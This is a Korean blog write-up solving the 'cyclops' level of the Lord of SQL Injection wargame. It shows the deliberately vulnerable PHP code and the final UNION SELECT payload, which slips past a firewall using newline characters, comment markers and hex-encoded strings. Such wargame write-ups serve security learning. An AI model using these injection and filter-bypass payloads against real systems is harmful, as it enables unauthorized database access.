---
title: "[Lord of SQL Injection] LoS - cyclops 문제풀이"
date: 2019-06-17
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

드디어 첫 번째 문제 업데이트의 마지막 문제인 `cyclops` 이다.
이번 문제는 단순히 `admin`으로 로그인을 하는 문제가 아니었다.  

<!--more-->

코드는 다음과 같다.  

```php
-----------------------------------------------------------------
query : select id,pw from prob_cyclops where id='' and pw=''
-----------------------------------------------------------------

<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id,pw from prob_cyclops where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['id'] === "first") && ($result['pw'] === "second")) solve("cyclops");//must use union select
  highlight_file(__FILE__);
?>
```

이번에는 `id`가 `first`, `pw`가 `second`여야 한다.
주석에 `must use union select`라고 적혀있는 것으로 보아 `union select 'first', 'second'` 같은 형태로 만들면 될 것 같다.
그래서 일단 아래처럼 시도 해 보았다.  

```plain
?id=1' union select 'first', 'second'#&pw=a
```

그럼 완성되는 쿼리는 아래와 같을 것이다.  

```mysql
select id,pw from prob_cyclops where id='1' union select 'first', 'second'#' and pw='a'
```

`'and pw='a'`는 주석처리 되어 실행되지 않기 때문에 결과적으로 `union select 'first', 'second`만 실행되며 `fist`, `second`만 추출 될 것이라고 생각했다.
그런데 저렇게 값을 넣으니까 방화벽에 잡혔다 ㅠㅠ
그렇게 호락호락한 문제가 아니었다 ㅠㅠ

그 뒤로 이것저것 시도 해 보다가 `개행 문자(%0a%0d)`를 넣어주면 방화벽에 잡히지 않는다는 것을 찾을 수 있었다.
또한 `select 'first', 'second'` 처럼 썼더니 또 방화벽에 걸려서 `select 0x6669727374, 0x7365636f6e64''`를 사용했다.
`0x6669727374`는 `first`이고, `0x7365636f6e64`는 `second`이며 뒤의 `''`는 아무 출력도 하지 않을 것이다.
최종적으로 입력한 값은 아래와 같다.  

```plain
?id=1'%23&pw=%0a%0dunion %23%0a%0ddistinct select 0x6669727374, 0x7365636f6e64''%23
```

`%23(#)`과 `%0a%0d(개행문자)`는 그래도 `URL Encoding` 해서 넘겨주었다.
그러면 완성되는 쿼리는 아래와 같다.  

```mysql
select id,pw from prob_cyclops where id='1'#' and pw=' 
union # 
distinct select 0x6669727374, 0x7365636f6e64''#'
```

첫 줄의 `id='1'#' and pw='`에서 `id='1'` 뒤의 값은 `#` 때문에 주석처리 된다.
개행 된 쿼리를 보고싶다면, 개행문자를 입력한 후 `Ctrl + u`를 통해 `소스보기`를 하면 아래와 같이 확인할 수 있다.  

```html
<hr>query : <strong>select id,pw from prob_cyclops where id='1'#' and pw='

union #

distinct select 0x6669727374, 0x7365636f6e64''#'</strong><hr>
```

어쨌든 이를 통해 문제를 풀 수 있었다.  

```php
---------------------------------------------------------------------------------------------------------------------------------
query : select id,pw from prob_cyclops where id='1'#' and pw=' union # distinct select 0x6669727374, 0x7365636f6e64''#'
---------------------------------------------------------------------------------------------------------------------------------

CYCLOPS Clear!
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id,pw from prob_cyclops where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['id'] === "first") && ($result['pw'] === "second")) solve("cyclops");//must use union select
  highlight_file(__FILE__);
?>
```

---

```plain
CYCLOPS Clear!!
```